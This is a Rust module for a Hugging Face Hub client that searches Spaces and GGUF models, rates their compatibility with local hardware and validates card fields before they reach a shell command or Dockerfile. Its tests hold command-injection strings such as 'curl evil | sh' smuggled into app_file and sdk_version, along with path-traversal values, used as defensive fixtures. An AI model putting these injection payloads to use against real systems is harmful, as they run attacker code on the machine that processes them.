//! Hugging Face Hub client: search Spaces and GGUF models, annotate each with a
//! compatibility verdict for this machine. Verdicts are honest guesses from
//! metadata; the store never claims more than "maybe" without a real run.

use regex::Regex;
use serde::{Deserialize, Serialize};
use tokio::task::JoinSet;

use crate::error::{Error, Result};

const HF: &str = "https://huggingface.co/api";

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Compat {
    Ready,
    Maybe,
    Incompatible,
}

#[derive(Debug, Clone, Serialize)]
pub struct SpaceSummary {
    pub id: String,
    pub author: String,
    pub name: String,
    pub sdk: Option<String>,
    pub sdk_version: Option<String>,
    pub likes: u64,
    pub hardware: Option<String>,
    pub app_port: u16,
    /// entry file for gradio/streamlit Spaces (HF runs `python app.py` itself)
    pub app_file: String,
    pub title: Option<String>,
    pub emoji: Option<String>,
    pub compat: Compat,
    pub compat_reason: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct ModelSummary {
    pub id: String,
    pub author: String,
    pub name: String,
    pub downloads: u64,
    pub likes: u64,
    pub pipeline_tag: Option<String>,
    pub compat: Compat,
    pub compat_reason: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct GgufFile {
    pub filename: String,
    pub quant: String,
    pub size_bytes: u64,
    pub fits: &'static str,
}

// ---- raw API shapes -------------------------------------------------------

#[derive(Deserialize)]
struct RawSpace {
    id: String,
    #[serde(default)]
    author: Option<String>,
    #[serde(default)]
    sdk: Option<String>,
    #[serde(default)]
    likes: u64,
    #[serde(default, rename = "cardData")]
    card: Option<RawCard>,
    #[serde(default)]
    runtime: Option<RawRuntime>,
}

#[derive(Deserialize, Default)]
struct RawCard {
    #[serde(default)]
    title: Option<String>,
    #[serde(default)]
    emoji: Option<String>,
    #[serde(default)]
    app_port: Option<u16>,
    #[serde(default)]
    app_file: Option<String>,
    #[serde(default)]
    sdk: Option<String>,
    /// Card YAML lets authors write `sdk_version: 3.5`, which arrives as a number.
    #[serde(default, deserialize_with = "string_or_number")]
    sdk_version: Option<String>,
}

fn string_or_number<'de, D: serde::Deserializer<'de>>(
    d: D,
) -> std::result::Result<Option<String>, D::Error> {
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum V {
        S(String),
        N(serde_json::Number),
        Other(serde::de::IgnoredAny),
    }
    Ok(match Option::<V>::deserialize(d)? {
        Some(V::S(s)) => Some(s),
        Some(V::N(n)) => Some(n.to_string()),
        Some(V::Other(_)) | None => None,
    })
}

#[derive(Deserialize, Default, Clone)]
struct RawRuntime {
    #[serde(default)]
    stage: Option<String>,
    #[serde(default)]
    hardware: Option<RawHardware>,
}

#[derive(Deserialize, Default, Clone)]
struct RawHardware {
    #[serde(default)]
    requested: Option<String>,
    #[serde(default)]
    current: Option<String>,
}

#[derive(Deserialize)]
struct RawModel {
    id: String,
    #[serde(default)]
    author: Option<String>,
    #[serde(default)]
    downloads: u64,
    #[serde(default)]
    likes: u64,
    #[serde(default)]
    pipeline_tag: Option<String>,
    #[serde(default)]
    siblings: Vec<RawSibling>,
}

#[derive(Deserialize)]
struct RawSibling {
    rfilename: String,
    #[serde(default)]
    size: Option<u64>,
}

// ---- Spaces ---------------------------------------------------------------

pub async fn search_spaces(
    http: &reqwest::Client,
    query: &str,
    limit: usize,
    has_gpu: bool,
) -> Result<Vec<SpaceSummary>> {
    let limit = limit.clamp(1, 60);
    let mut url = format!("{HF}/spaces?limit={limit}&sort=likes&direction=-1&full=true");
    if !query.trim().is_empty() {
        url.push_str(&format!("&search={}", urlencode(query.trim())));
    }
    let raw: Vec<RawSpace> = get(http, &url).await?;

    // Hardware tier only comes from the detail endpoint; fetch them concurrently.
    let mut set = JoinSet::new();
    for (i, s) in raw.iter().enumerate() {
        let http = http.clone();
        let id = s.id.clone();
        set.spawn(async move {
            let rt = get::<RawSpace>(&http, &format!("{HF}/spaces/{id}"))
                .await
                .ok()
                .and_then(|d| d.runtime);
            (i, rt)
        });
    }
    let mut runtimes: Vec<Option<RawRuntime>> = vec![None; raw.len()];
    while let Some(Ok((i, rt))) = set.join_next().await {
        runtimes[i] = rt;
    }

    Ok(raw
        .into_iter()
        .zip(runtimes)
        .map(|(s, rt)| summarize_space(s, rt, has_gpu))
        .collect())
}

/// Details for one Space (used at launch time).
pub async fn space(http: &reqwest::Client, id: &str, has_gpu: bool) -> Result<SpaceSummary> {
    validate_repo(id)?;
    let d: RawSpace = get(http, &format!("{HF}/spaces/{id}")).await?;
    let rt = d.runtime.clone();
    Ok(summarize_space(d, rt, has_gpu))
}

fn summarize_space(s: RawSpace, runtime: Option<RawRuntime>, has_gpu: bool) -> SpaceSummary {
    let (author, name) = split_repo(&s.id);
    let author = s.author.unwrap_or(author);
    let card = s.card.unwrap_or_default();
    let sdk = s.sdk.or(card.sdk);
    let app_port = card.app_port.unwrap_or(match sdk.as_deref() {
        Some("streamlit") => 8501,
        _ => 7860,
    });
    let app_file = card
        .app_file
        .filter(|f| safe_app_file(f))
        .unwrap_or_else(|| "app.py".to_string());
    let sdk_version = card.sdk_version.filter(|v| safe_sdk_version(v));
    let runtime = runtime.unwrap_or_default();
    let hardware = runtime.hardware.and_then(|h| h.requested.or(h.current));
    let (compat, reason) = space_compat(
        sdk.as_deref(),
        runtime.stage.as_deref(),
        hardware.as_deref(),
        has_gpu,
    );
    SpaceSummary {
        id: s.id,
        author,
        name,
        sdk,
        sdk_version,
        likes: s.likes,
        hardware,
        app_port,
        app_file,
        title: card.title,
        emoji: card.emoji,
        compat,
        compat_reason: reason,
    }
}

/// `stage` is HF's own build/run state. Only a Space that built on HF has an
/// image in `registry.hf.space`; a broken one cannot be pulled at all.
fn space_compat(
    sdk: Option<&str>,
    stage: Option<&str>,
    hw: Option<&str>,
    has_gpu: bool,
) -> (Compat, Option<String>) {
    match stage {
        Some("RUNNING")
        | Some("SLEEPING")
        | Some("PAUSED")
        | Some("RUNNING_APP_STARTING")
        | None => {}
        Some(other) => {
            return (
                Compat::Incompatible,
                Some(format!(
                    "Space is `{other}` on Hugging Face; no image to pull"
                )),
            )
        }
    }
    match sdk {
        Some("static") => {
            return (
                Compat::Incompatible,
                Some("Static HTML Space; nothing to run locally".into()),
            )
        }
        Some("gradio") | Some("streamlit") | Some("docker") => {}
        Some(other) => {
            return (
                Compat::Maybe,
                Some(format!("Unknown SDK `{other}`; image may still run")),
            )
        }
        None => return (Compat::Maybe, Some("SDK not declared".into())),
    }
    let wants_gpu = hw.map(|h| !h.starts_with("cpu")).unwrap_or(false);
    match (wants_gpu, has_gpu) {
        (false, _) => (Compat::Ready, None),
        (true, true) => (
            Compat::Maybe,
            Some(format!(
                "Space asks for `{}` on HF; will use the local GPU, VRAM may differ",
                hw.unwrap_or("gpu")
            )),
        ),
        (true, false) => (
            Compat::Incompatible,
            Some(format!(
                "Space needs a GPU (`{}`); none available",
                hw.unwrap_or("gpu")
            )),
        ),
    }
}

// ---- Models ---------------------------------------------------------------

pub async fn search_models(
    http: &reqwest::Client,
    query: &str,
    limit: usize,
) -> Result<Vec<ModelSummary>> {
    let limit = limit.clamp(1, 60);
    let mut url = format!("{HF}/models?limit={limit}&filter=gguf&sort=downloads&direction=-1");
    if !query.trim().is_empty() {
        url.push_str(&format!("&search={}", urlencode(query.trim())));
    }
    let raw: Vec<RawModel> = get(http, &url).await?;
    Ok(raw.into_iter().map(summarize_model).collect())
}

fn summarize_model(m: RawModel) -> ModelSummary {
    let (author, name) = split_repo(&m.id);
    let author = m.author.unwrap_or(author);
    let (compat, reason) = match m.pipeline_tag.as_deref() {
        None | Some("text-generation") => (Compat::Ready, None),
        Some("image-text-to-text") => (
            Compat::Maybe,
            Some("Vision model; needs a matching mmproj file, chat UI is text only".into()),
        ),
        Some(other) => (
            Compat::Incompatible,
            Some(format!(
                "Ollama serves text generation GGUF only; this is `{other}`"
            )),
        ),
    };
    ModelSummary {
        id: m.id,
        author,
        name,
        downloads: m.downloads,
        likes: m.likes,
        pipeline_tag: m.pipeline_tag,
        compat,
        compat_reason: reason,
    }
}

/// GGUF files in a repo, smallest first, with a fit verdict against `budget_mb`,
/// the accelerator's effective memory (`RuntimeStatus::effective_memory_mb`).
pub async fn model_files(
    http: &reqwest::Client,
    repo: &str,
    budget_mb: Option<u64>,
) -> Result<Vec<GgufFile>> {
    validate_repo(repo)?;
    let m: RawModel = get(http, &format!("{HF}/models/{repo}?blobs=true")).await?;
    let quant_re = Regex::new(r"(?i)[-_.]((?:I?Q\d[A-Z0-9_]*)|BF16|F16|F32|FP16)\.gguf$").unwrap();
    let shard_re = Regex::new(r"-\d{5}-of-\d{5}\.gguf$").unwrap();
    let mut files: Vec<GgufFile> = m
        .siblings
        .into_iter()
        .filter(|s| s.rfilename.to_ascii_lowercase().ends_with(".gguf"))
        .filter(|s| !shard_re.is_match(&s.rfilename))
        .filter(|s| !s.rfilename.to_ascii_lowercase().contains("mmproj"))
        .map(|s| {
            let quant = quant_re
                .captures(&s.rfilename)
                .and_then(|c| c.get(1))
                .map(|m| m.as_str().to_ascii_uppercase())
                .unwrap_or_else(|| "UNKNOWN".into());
            let size = s.size.unwrap_or(0);
            GgufFile {
                fits: fit(size, budget_mb),
                filename: s.rfilename,
                quant,
                size_bytes: size,
            }
        })
        .collect();
    files.sort_by_key(|f| f.size_bytes);
    Ok(files)
}

/// Bytes a GGUF of `size` occupies once loaded: the weights, an eighth for
/// compute buffers, and about 1.5 GB of KV cache at the default context.
pub fn model_need_bytes(size: u64) -> u64 {
    size + size / 8 + 1_500_000_000
}

/// Weights plus ~1.5 GB of KV cache must fit the accelerator's budget to be
/// "gpu"; up to 16 GB of spill is "partial" (CPU offload); beyond that "no".
/// The budget is dedicated VRAM on a discrete card and half of system RAM on a
/// unified part (`hardware::unified_budget_mb`), never the iGPU's carve-out.
fn fit(size: u64, budget_mb: Option<u64>) -> &'static str {
    let Some(vram) = budget_mb else {
        return "partial";
    };
    let vram = vram * 1024 * 1024;
    let need = model_need_bytes(size);
    if need <= vram {
        "gpu"
    } else if need <= vram + 16_000_000_000 {
        "partial"
    } else {
        "no"
    }
}

// ---- helpers --------------------------------------------------------------

async fn get<T: for<'de> Deserialize<'de>>(http: &reqwest::Client, url: &str) -> Result<T> {
    let resp = http.get(url).send().await?;
    if !resp.status().is_success() {
        return Err(Error::Hf(format!("{} -> {}", url, resp.status())));
    }
    Ok(resp.json::<T>().await?)
}

/// Card fields end up in a shell command (`python {app_file}`) and a Dockerfile
/// (`gradio=={sdk_version}`). Anyone can publish a Space, so these are
/// allowlists: a value that fails falls back to the default, never gets patched.
/// A relative path is fine (`demos/musicgen_app.py`); `..`, hidden
/// segments and an absolute path are not.
fn safe_app_file(f: &str) -> bool {
    !f.is_empty()
        && f.split('/').all(|seg| {
            !seg.is_empty()
                && !seg.starts_with('.')
                && seg
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        })
}

fn safe_sdk_version(v: &str) -> bool {
    !v.is_empty()
        && v.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-'))
}

pub fn validate_repo(id: &str) -> Result<()> {
    let parts: Vec<&str> = id.split('/').collect();
    let seg_ok = |p: &str| {
        !p.is_empty()
            && !p.starts_with('.')
            && p.chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    };
    if parts.len() == 2 && parts.iter().all(|p| seg_ok(p)) {
        Ok(())
    } else {
        Err(Error::Other(format!(
            "`{id}` is not an `owner/name` repo id"
        )))
    }
}

pub fn split_repo(id: &str) -> (String, String) {
    match id.split_once('/') {
        Some((a, n)) => (a.to_string(), n.to_string()),
        None => (String::new(), id.to_string()),
    }
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fit_thresholds() {
        assert_eq!(fit(5_000_000_000, Some(10240)), "gpu");
        assert_eq!(fit(9_000_000_000, Some(10240)), "partial");
        assert_eq!(fit(40_000_000_000, Some(10240)), "no");
        assert_eq!(fit(1, None), "partial");
    }

    #[test]
    fn space_verdicts() {
        let run = Some("RUNNING");
        assert_eq!(
            space_compat(Some("static"), run, None, true).0,
            Compat::Incompatible
        );
        assert_eq!(
            space_compat(Some("gradio"), run, Some("cpu-basic"), false).0,
            Compat::Ready
        );
        assert_eq!(
            space_compat(Some("gradio"), run, Some("zero-a10g"), true).0,
            Compat::Maybe
        );
        assert_eq!(
            space_compat(Some("docker"), run, Some("t4-small"), false).0,
            Compat::Incompatible
        );
        assert_eq!(
            space_compat(
                Some("gradio"),
                Some("RUNTIME_ERROR"),
                Some("cpu-basic"),
                true
            )
            .0,
            Compat::Incompatible
        );
        assert_eq!(
            space_compat(Some("gradio"), Some("SLEEPING"), Some("cpu-basic"), true).0,
            Compat::Ready
        );
    }

    #[test]
    fn numeric_sdk_version_is_tolerated() {
        let raw: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","cardData":{"sdk":"gradio","sdk_version":3.5,"app_file":"app.py"}}"#,
        )
        .unwrap();
        assert_eq!(raw.card.unwrap().sdk_version.as_deref(), Some("3.5"));
        let raw: RawSpace =
            serde_json::from_str(r#"{"id":"a/b","cardData":{"sdk_version":"4.44.1"}}"#).unwrap();
        assert_eq!(raw.card.unwrap().sdk_version.as_deref(), Some("4.44.1"));
    }

    #[test]
    fn hostile_card_fields_fall_back_to_defaults() {
        let raw: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","sdk":"gradio","cardData":{
                "app_file":"app.py\ncurl evil | sh",
                "sdk_version":"5.0.0\" && curl evil | sh && echo \""}}"#,
        )
        .unwrap();
        let s = summarize_space(raw, None, true);
        assert_eq!(s.app_file, "app.py");
        assert_eq!(s.sdk_version, None);

        let raw: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","sdk":"gradio","cardData":{"app_file":"demo_v2.py","sdk_version":"4.44.1"}}"#,
        )
        .unwrap();
        let s = summarize_space(raw, None, true);
        assert_eq!(s.app_file, "demo_v2.py");

        // facebook/MusicGen keeps its entry point in a subdirectory (#46).
        for (given, want) in [
            ("demos/musicgen_app.py", "demos/musicgen_app.py"),
            ("../etc/passwd", "app.py"),
            ("/app.py", "app.py"),
            ("demos/.hidden.py", "app.py"),
            ("demos//x.py", "app.py"),
        ] {
            let raw: RawSpace = serde_json::from_str(&format!(
                r#"{{"id":"a/b","sdk":"gradio","cardData":{{"app_file":"{given}"}}}}"#
            ))
            .unwrap();
            assert_eq!(summarize_space(raw, None, true).app_file, want, "{given}");
        }
        assert_eq!(s.sdk_version.as_deref(), Some("4.44.1"));

        for bad in ["", ".env", "../app.py", "a b.py", "`id`.py", "$(x).py"] {
            assert!(!safe_app_file(bad), "{bad:?} should be rejected");
        }
        for bad in ["", "5.0.0\"", "5 && x", "5;x"] {
            assert!(!safe_sdk_version(bad), "{bad:?} should be rejected");
        }
    }

    #[test]
    fn repo_validation() {
        assert!(validate_repo("Qwen/Qwen3-8B-GGUF").is_ok());
        assert!(validate_repo("../etc").is_err());
        assert!(validate_repo("a/b/c").is_err());
    }
}
